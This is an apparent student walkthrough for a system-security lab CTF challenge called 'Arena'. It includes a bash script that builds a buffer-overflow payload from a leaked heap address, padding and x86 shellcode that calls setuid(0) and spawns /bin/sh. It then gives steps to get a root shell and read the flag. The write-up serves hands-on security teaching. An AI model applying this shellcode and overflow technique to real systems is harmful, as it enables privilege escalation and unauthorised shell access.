
# CTF 6 - Arena

## SETUP

1. Deploy your challenge instance
1. Open ***2 Terminals*** and connect to your instance with:

    ``` bash
    ssh {unix_username}@syssec-lab.s3.eurecom.fr -p {port_number}
    ```

1. Create an empty weapon file

    ```bash
    touch weapons
    ```

1. Create a file called "gen_weapon"

    ```bash
    vi gen_weapons
    ```

1. Copy the following code into "gen_weapon"

    ```bash
    if [ $# -eq 0 ]; then
        echo "Usage: $0 <hex_address>"
        exit 1
    fi

    hex_address="$1"
    
    hex_address="${hex_address#0x}"

    hex_address=$(printf "%x\n" $((16#${hex_address} + 4)))

    if [ ${#hex_address} -eq 7 ]; then
        hex_address="0${hex_address}"
    fi


    little_endian=""
    for ((i = ${#hex_address} - 2; i >= 0; i -= 2)); do
        little_endian="${little_endian}\x${hex_address:i:2}"
    done

    padding_length=8186

    shellcode="\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

    padding=$(printf 'A%.0s' $(seq "$padding_length"))

    exploit_string="98 99 $padding$little_endian$shellcode"

    echo -e "$exploit_string" > weapons
    ```

## ATTACK

1. In **Terminal 1** run the ***arena*** program

    ```bash
    ./arena/arena weapons
    ```

1. Copy paste the content of **[`player`](players)** in the terminal to create 1251 players.

    You will get the following message containing an ***address***.

    > Too many players... Kicking player '{name_of_the_player}' (0x923f470)

1. In **Terminal 2** run gen_weapons with the previous address

    ```bash
    bash gen_weapons 0x923f470
    ```

1. Then in **Terminal 1**:

    1. Press 1 to load weaponry

        ```bash
        What do you want to do? (1: load weaponry, 2: add new player, 3: fight, 4: quit) 1

        1 weapons loaded!
        ```

    1. Press 3 to start the fight. The figh migh end without popping the shell. In this case press 3 again to start the fight until the shell appear

    Once you get the shell, you can cat the flag

    ```console
    # cat arena/flag
    ```
